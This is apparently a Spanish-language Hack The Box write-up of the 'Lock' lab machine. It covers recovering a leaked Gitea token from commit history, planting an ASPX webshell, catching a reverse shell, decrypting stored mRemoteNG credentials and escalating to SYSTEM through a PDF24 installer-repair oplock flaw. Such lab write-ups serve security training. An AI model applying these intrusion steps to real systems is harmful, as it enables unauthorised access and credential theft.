---
tags:
title: Lock  - Easy (HTB)
permalink: /Lock-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
 nmap -sCV -p80,445,3000,3389 10.129.234.64
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 18:02 -0500
Nmap scan report for 10.129.234.64
Host is up (0.61s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Lock - Index
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=35b2758867950fc3; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=wKUeg-SmzS67wOC-_ucnW1HNKVY6MTc3MDI0NjM2MDAzNDg2MDIwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 04 Feb 2026 23:06:00 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=652a746b804da794; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=IHL9_eO7iP3xGqF9k0AbsZAWJlQ6MTc3MDI0NjM2MzE4MDMxNTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 04 Feb 2026 23:06:03 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-04T23:07:32+00:00; +3m08s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2026-02-03T22:56:39
|_Not valid after:  2026-08-05T22:56:39
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-04T23:06:56+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=2/4%Time=6983D01B%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,2A6C,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\
SF:x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=3
SF:5b2758867950fc3;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:
SF:\x20_csrf=wKUeg-SmzS67wOC-_ucnW1HNKVY6MTc3MDI0NjM2MDAzNDg2MDIwMA;\x20Pa
SF:th=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options
SF::\x20SAMEORIGIN\r\nDate:\x20Wed,\x2004\x20Feb\x202026\x2023:06:00\x20GM
SF:T\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-a
SF:uto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device-
SF:width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20cu
SF:p\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:appl
SF:ication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSI
SF:sInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdX
SF:JsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vb
SF:G9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmci
SF:LCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method
SF:\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-C
SF:ookie:\x20i_like_gitea=652a746b804da794;\x20Path=/;\x20HttpOnly;\x20Sam
SF:eSite=Lax\r\nSet-Cookie:\x20_csrf=IHL9_eO7iP3xGqF9k0AbsZAWJlQ6MTc3MDI0N
SF:jM2MzE4MDMxNTYwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSit
SF:e=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2004\x20Feb\x
SF:202026\x2023:06:03\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-02-04T23:06:56
|_  start_date: N/A
|_clock-skew: mean: 3m07s, deviation: 0s, median: 3m07s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.90 seconds
```

## Website 

En la pagina no hay nada de nada, parece ser estática.

![image-center](/assets/images/Pasted image 20260204201446.png)
## Gitea

En el puerto `3000` corre `gitea` y cuando fui a la seccion de `Explore` vi un repositorio.

![image-center](/assets/images/Pasted image 20260204201501.png)

El mismo contenía un solo script en `python3`, el cual es encargaba de poder hacer solicitudes a una pagina de `gitea` y así obtener y recolectar todos los repositorios de cada usuario, pero seteando la variable `GITEA_ACCESS_TOKEN`.

![image-center](/assets/images/Pasted image 20260204202639.png)
### Recover token

Sin embargo mucho no puedo hacer ya que no cuento con el token, pero viendo si hay `commits` viejos, veo que si.

![image-center](/assets/images/Pasted image 20260204202659.png)

Veo que es sobre el mismo archivo.

![image-center](/assets/images/Pasted image 20260204202707.png)

En el mismo, puedo ver el valor del token que tengo q asignar.

![image-center](/assets/images/Pasted image 20260204202745.png)
## Shell as ellen.freeman

Para setearlo use:

```bash
export GITEA_ACCESS_TOKEN='<token>'
```

Y luego de ejecutarlo, pude ver un repositorio adicional sobre la web que corre por el puerto `80`.

```bash
python3 gitea.py http://10.129.234.64:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```
### Webshell 

Aca no encontre mucho, sin embargo como tengo el token y las credenciales de `ellen`, puedo crear archivos y luego subirlos al repositorio, haciendo que se reflejen en la web. Para eso me descargue una [Webshell](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx) `aspx` y la coloque en el directorio `website`.

Con `git add` lo agregue, configure un nombre que claramente es `ellen.freeman` y comitee, y con un `push` aplique el cambio.

```bash
git add .
git config user.email "ellen.freeman@oplock.vl"
git config user.name "Ellen Freeman"
git commit -m "update"
[main 4d60cf0] update
 1 file changed, 96 insertions(+)
git push http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 1.32 KiB | 1.32 MiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.234.64:3000/ellen.freeman/website.git
   73cdcc1..4d60cf0  main -> main
```

Luego me fui a la web principal y mi archivo estaba ahi.

![image-center](/assets/images/Pasted image 20260204205432.png)

Y ejecutando comandos veo que lo hago como el usuario `ellen.freeman`.

![image-center](/assets/images/Pasted image 20260204205446.png)
### Shell

Por lo que me envié una Reverse shell a mi maquina.

![image-center](/assets/images/Pasted image 20260204205629.png)

Y desde mi listener `nc` la recibí.

```powershell
 rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.64] 55684
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\windows\system32\inetsrv> whoami
whoami
lock\ellen.freeman
```
## RDP as gale.dekarios
### mRemoteNG configuration file

Como vi que `mRemoteNG` estaba instalado en el sistema, fui a ver si el archivo de configuración del mismo estaba, y de hecho si.

```bash
PS C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG> ls
ls


    Directory: C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG


Mode                 LastWriteTime         Length Name                       
----                 -------------         ------ ----                       
d-----        12/28/2023   5:58 AM                Themes                     
-a----        12/28/2023   5:59 AM           3341 confCons.xml               
-a----        12/28/2023   5:58 AM            340 confCons.xml.20231228-0558390956.backup
-a----        12/28/2023   5:58 AM           3242 confCons.xml.20231228-0558434222.backup
-a----        12/28/2023   5:58 AM           3236 confCons.xml.20231228-0558502242.backup
-a----        12/28/2023   5:58 AM           3249 confCons.xml.20231228-0558531392.backup
-a----        12/28/2023   5:58 AM           3253 confCons.xml.20231228-0558577172.backup
-a----        12/28/2023   5:58 AM           3341 confCons.xml.20231228-0559136449.backup
-a----        12/28/2023   5:59 AM           3341 confCons.xml.20231228-0559140364.backup
-a----        12/28/2023   5:59 AM           3341 confCons.xml.20231228-0559599708.backup
-a----        12/28/2023   5:59 AM             51 extApps.xml                
-a----        12/28/2023   5:59 AM           2014 mRemoteNG.log              
-a----        12/28/2023   5:59 AM           2246 pnlLayout.xml
```

Viendo el contenido del mismo tenia unas credenciales para el usuario `gale.dekarios`.

```powershell
PS C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG> cat confCons.xml
cat confCons.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==" Hostname="Lock" Protocol="RDP" 
<SNIP>
```

Para desencriptar esta cadena use [este script](https://github.com/kmahyyg/mremoteng-decrypt) en Python3.

Viendo el manual veo que para pasarle la cadena uso el parámetro `-s`.

```bash
 python3 mremoteng_decrypt.py -h
usage: mremoteng_decrypt.py [-h] [-f FILE | -rf REALFILE | -s STRING] [-p PASSWORD] [-L LEGACY]

Decrypt mRemoteNG passwords.

options:
  -h, --help            show this help message and exit
  -f, --file FILE       Name of file containing mRemoteNG password
  -rf, --realFile REALFILE
                        Name of the Real mRemoteNG connections file containing the passwords
  -s, --string STRING   base64 string of mRemoteNG password
  -p, --password PASSWORD
                        Custom password
  -L, --legacy LEGACY   version <= 1.74
```

Así que después de ejecutar descubrí la password de este usuario.

```bash
python3 mremoteng_decrypt.py -s LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==
Password: ty8wnW9qCKDosXo6
```
### Connection

Para realizar la conexión use `xfreerdp3`.

```powershell
xfreerdp3 /v:10.129.234.64 /u:gale.dekarios /p:ty8wnW9qCKDosXo6
```

![image-center](/assets/images/Pasted image 20260204212157.png)
### Exploit
En la maquina estaba instalado `PDF24`, mas en concreto en la versión `11.15.1`.

![image-center](/assets/images/Pasted image 20260204212456.png)

Que como indica este enlace, contiene una vulnerabilidad la cual permite a un usuario de bajos privilegios, llegar a `SYSTEM`.

Para eso primero tenemos que localizar el archivo de instalación de este `software`, que se encuentra en la ruta `C:\_install`.

```bash
C:\Users\gale.dekarios\Desktop>dir C:\pdf24-creator-11.15.1-x64.msi /s
 Volume in drive C has no label.
 Volume Serial Number is 8592-A9D9

 Directory of C:\_install

12/14/2023  10:07 AM       462,602,240 pdf24-creator-11.15.1-x64.msi
               1 File(s)    462,602,240 bytes

     Total Files Listed:
               1 File(s)    462,602,240 bytes
               0 Dir(s)   5,576,040,448 bytes free
```

Como en el mismo link dice:

>Al final del proceso de reparación, el subproceso pdf24-PrinterInstall.exe se llama con privilegios de `SYSTEM` y realiza una acción de escritura en el archivo "`C:\Program Files\PDF24\faxPrnInst.log`". Esto puede ser utilizado por un atacante simplemente configurando un bloqueo en el archivo tan pronto como se lea. Para ello, se puede utilizar la herramienta 'SetOpLock.exe' de "https://github.com/googleprojectzero/symboliclink-testing-tools"

En mi caso lo subí a la maquina con el nombre de `sp.exe` y ejecute el siguiente comando.

![image-center](/assets/images/Pasted image 20260204223810.png)

Luego localice el archivo de instalación y lo ejecute.

![image-center](/assets/images/Pasted image 20260204223825.png)

Le di a repair`.

![image-center](/assets/images/Pasted image 20260204224033.png)

Y luego de aceptar todo, me salió la ventana del instalador, en la misma en la parte superior hice `click izquierdo`.

![image-center](/assets/images/Pasted image 20260204224149.png)

Seleccione `Properties`.

![image-center](/assets/images/Pasted image 20260204224202.png)

Y luego en el link de abajo, lo abri con `Firefox` ya que como en el mismo blog dice, no se puede usar ni `edge` o `internet explorer`.

![image-center](/assets/images/Pasted image 20260204224218.png)
### Shell

Luego presión `Ctrl + o` y escribí `cmd.exe` en el buscador.

![image-center](/assets/images/Pasted image 20260204224303.png)

De manera que dando enter, me dio una shell como `SYSTEM`.

![image-center](/assets/images/Pasted image 20260204223929.png)

```powershell
c:\Users\Administrator\Desktop>type root.txt
f845ff781d722da10e774724ed628528
```

`Happy Hacking.`